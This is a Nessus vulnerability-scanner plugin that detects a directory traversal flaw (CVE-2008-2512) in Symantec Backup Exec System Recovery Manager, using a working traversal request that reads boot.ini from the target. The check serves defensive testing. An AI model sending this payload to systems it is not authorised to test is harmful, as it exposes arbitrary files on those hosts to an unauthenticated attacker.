#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(32475);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2008-2512");
  script_bugtraq_id(29350);
  script_osvdb_id(45680);
  script_xref(name:"Secunia", value:"30432");

  script_name(english:"Symantec Backup Exec System Recovery Manager Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a local file with BESR");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Tomcat servlet that is prone to a
directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running Symantec Backup Exec System
Recovery Manager, a backup manager solution. 

The Tomcat servlet 'reportsfile' included in the version of Backup
Exec System Recovery Manager installed on the remote host fails to
properly sanitize user input to the 'filename' parameter of directory
traversal sequences.  An unauthenticated, remote attacker can leverage
this issue to view arbitrary files on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6f519315" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Symantec Backup Exec System Recovery Manager version 8.0.2
/ 7.0.4 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/05/29");
 script_cvs_date("$Date: 2016/05/04 14:21:29 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:8080);

# Unless we're paranoid, make sure it's Backup Exec System Recovery Manager.
if (report_paranoia < 2)
{
  r = http_send_recv3(method:"GET", item:"/axis/DirectDownload.jsp", port:port);
  if (isnull(r)) exit(0);
  res = r[2];
  if ("Backup Exec System Recovery Manager" >!< res) exit(0);
}


# Try to retrieve a local file.
file = "\\boot.ini";
url = string(
  "/axis/reportsfile?",
  "filename=...\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..", file
);

r = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(r)) exit(0);
res = r[2];

# There's a problem if looks like boot.ini.
if ("[boot loader]" >< res)
{
  if (report_verbosity)
  {
    url = build_url(port: port, qs: url);

    report = string(
      "\n",
      "Nessus was able to retrieve the contents of '", file, "'\n",
      "using the URL :\n",
      "\n",
      "  ", url, "\n"
    );
    if (report_verbosity > 1)
    {
      report = string(
        report,
        "\n",
        "The response was :\n",
        "\n",
        res
      );
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
